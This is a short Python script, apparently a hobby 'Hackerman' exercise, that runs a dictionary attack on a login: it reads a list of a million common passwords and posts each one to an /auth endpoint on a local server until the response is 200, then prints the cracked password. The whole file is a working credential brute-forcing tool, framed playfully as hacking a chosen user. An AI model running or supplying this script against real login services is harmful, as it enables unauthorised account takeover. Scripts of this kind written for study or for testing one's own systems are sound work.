import requests

print('''
    __  __           __                                      ___ ____ 
   / / / /___ ______/ /_____  _________ ___  ____ _____     <  // __ |
  / /_/ / __ `/ ___/ //_/ _ \/ ___/ __ `__ \/ __ `/ __ \    / // / / /
 / __  / /_/ / /__/ ,< /  __/ /  / / / / / / /_/ / / / /   / // /_/ / 
/_/ /_/\__,_/\___/_/|_|\___/_/  /_/ /_/ /_/\__,_/_/ /_/   /_(_)____/  
                                                                      ''')

print('\nHello young hackerman (⌐▨_▨)')

login = input('Input login which you want to hack(Check existing in users.json):   ')


with open('10-million-password-list-top-1000000.txt') as f:  # get all popular passwords from .txt
    content = f.read()

passwords = content.split('\n')
for password in passwords:  # we going through all the passwords until the server response is 200
    response = requests.post('http://127.0.0.1:5000/auth',  # your local server address
                             json={'login': login, 'password': password})
    print(password)
    if response.status_code == 200:
        print(f'\nSUCCESS\n{login} password is --> {password}')
        break
